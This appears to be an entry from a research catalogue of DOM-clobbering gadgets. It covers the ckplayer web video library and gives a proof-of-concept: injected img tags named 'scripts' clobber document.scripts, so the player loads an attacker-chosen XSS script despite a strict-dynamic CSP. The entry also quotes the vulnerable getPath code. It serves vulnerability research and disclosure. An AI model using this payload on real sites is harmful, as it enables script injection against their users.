---
description: ckplayer是一款用于在网页端播放视频的软件，支持mp4点播，,flv点播和直播，m3u8的点播和直播，ts直播，支持移动端，PC端
gadgets:
  Latest:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-func-call
    pocs:
      - description: The [ckplayer](https://gitee.com/niandeng/ckplayer/tree/master) library uses the `document.scripts` property to additional scripts.
        code: |
          <!-- user input -->
          <img name="scripts" src="[current-location]/assets/xss/index.js#/js/">
          <img name="scripts" src="[current-location]/assets/xss/index.js#/js/">

          <script nonce="secret" src="/assets/libs/ckplayer/ckplayer.js"></script>
          <div class="video"></div>
          <script nonce="secret" type="text/javascript">
              var videoObject = {
                  language: 'en',
                  container: '.video',
                  video: 'https://example.com/a.mp4'
              };
              var player = new ckplayer(videoObject);
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://gitee.com/niandeng/ckplayer/blob/master/ckplayer/js/ckplayer.js#L6819">https://gitee.com/niandeng/ckplayer/blob/master/ckplayer/js/ckplayer.js#L6819</a>

      ```javascript
      function getPath(siz) {
        var scriptList = document.scripts,
          thisPath = scriptList[scriptList.length - 1].src;
        for (var i = 0; i < scriptList.length; i++) {
          var scriptName = scriptList[i].getAttribute('name') || scriptList[i].getAttribute('data-name');
          var src = scriptList[i].src.slice(scriptList[i].src.lastIndexOf('/') + 1, scriptList[i].src.lastIndexOf('.'));
          if ((scriptName && (scriptName == 'ckplayer' || scriptName == 'ckplayer.min')) || (scriptList[i].src && (src == 'ckplayer' || src == 'ckplayer.min'))) {
            thisPath = scriptList[i].src;
            break;
          }
        }
        var path=thisPath.substring(0, thisPath.lastIndexOf('/js/') + 1);
        if(!isUndefined(siz)){
          path+=siz+'/';
        }
        return path;
      }
      ```
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/ckplayer.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
